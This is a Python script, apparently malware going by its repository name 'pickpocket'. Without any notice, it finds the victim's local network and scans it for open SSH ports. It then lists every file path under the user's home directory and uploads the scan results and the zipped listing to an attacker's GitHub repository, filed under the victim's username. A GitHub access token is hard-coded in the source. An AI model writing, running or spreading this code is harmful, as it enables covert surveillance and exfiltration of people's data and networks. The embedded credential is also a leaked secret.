import os
import io
import psutil
import socket
import ipaddress
import getpass
import threading
import json
import base64
import requests
import zipfile
import datetime
from queue import Queue
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "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")
REPO_OWNER = os.getenv("GITHUB_OWNER", "zerocool979")
REPO_NAME = os.getenv("GITHUB_REPO", "pickpocket")
REPO_BRANCH = os.getenv("GITHUB_BRANCH", "main")
GITHUB_API_URL = "https://api.github.com"
GITHUB_HEADERS = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}
def get_file_sha(file_path, branch=REPO_BRANCH):
    try:
        url = f"{GITHUB_API_URL}/repos/{REPO_OWNER}/{REPO_NAME}/contents/{file_path}"
        response = requests.get(url, headers=GITHUB_HEADERS, params={"ref": branch})
        response.raise_for_status()
        return response.json().get("sha")
    except requests.exceptions.RequestException:
        return None
def upload_to_github(file_path, content, message, branch=REPO_BRANCH):
    payload = {
        "message": message,
        "content": base64.b64encode(content).decode("utf-8"),
        "branch": branch
    }
    file_sha = get_file_sha(file_path, branch)
    if file_sha:
        payload["sha"] = file_sha
    try:
        url = f"{GITHUB_API_URL}/repos/{REPO_OWNER}/{REPO_NAME}/contents/{file_path}"
        response = requests.put(url, headers=GITHUB_HEADERS, data=json.dumps(payload))
        response.raise_for_status()
        return response
    except requests.exceptions.RequestException:
        return None
def check_port(ip, port=22, timeout=0.5):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return s.connect_ex((ip, port)) == 0
    except socket.error:
        return False
def discover_network():
    for _, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if (addr.family == socket.AF_INET and
                not ipaddress.ip_address(addr.address).is_loopback and
                addr.netmask):
                try:
                    return str(ipaddress.ip_network(
                        f"{addr.address}/{addr.netmask}", strict=False
                    ))
                except ValueError:
                    continue
    return None
def scan_worker(queue, results, port):
    while not queue.empty():
        ip = queue.get()
        if check_port(str(ip), port):
            results.append({"ip": str(ip), "port_open": True})
        queue.task_done()
def scan_network(network, port=22, threads=100):
    if not network:
        return []
    net = ipaddress.ip_network(network, strict=False)
    queue = Queue()
    results = []
    for ip in net.hosts():
        queue.put(ip)
    for _ in range(threads):
        thread = threading.Thread(
            target=scan_worker,
            args=(queue, results, port),
            daemon=True
        )
        thread.start()
    queue.join()
    return results
def collect_user_files():
    home = os.path.expanduser("~")
    files = []
    for root, _, filenames in os.walk(home):
        for filename in filenames:
            try:
                files.append(os.path.join(root, filename))
            except (OSError, Exception):
                continue
    return files
def create_file_archive():
    files = collect_user_files()
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        file_list_content = "\n".join(files).encode('utf-8')
        zipf.writestr('file_structure.txt', file_list_content)
    zip_buffer.seek(0)
    return len(files), zip_buffer.getvalue()
def main():
    if GITHUB_TOKEN == "your_github_personal_access_token" or REPO_OWNER == "your_github_username":
        return
    local_network = discover_network()
    if local_network:
        scan_results = scan_network(local_network, port=22, threads=100)
    else:
        scan_results = []
    file_count, zip_data = create_file_archive()
    timestamp = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H-%M-%SZ")
    username = getpass.getuser()
    base_path = f"scan_data/{username}/{timestamp}"
    upload_to_github(
        file_path=f"{base_path}/network_scan.json",
        content=json.dumps(scan_results, indent=4).encode('utf-8'),
        message=f"Add network scan results for {username} at {timestamp}"
    )
    upload_to_github(
        file_path=f"{base_path}/file_structure.zip",
        content=zip_data,
        message=f"Add file structure for {username} at {timestamp}"
    )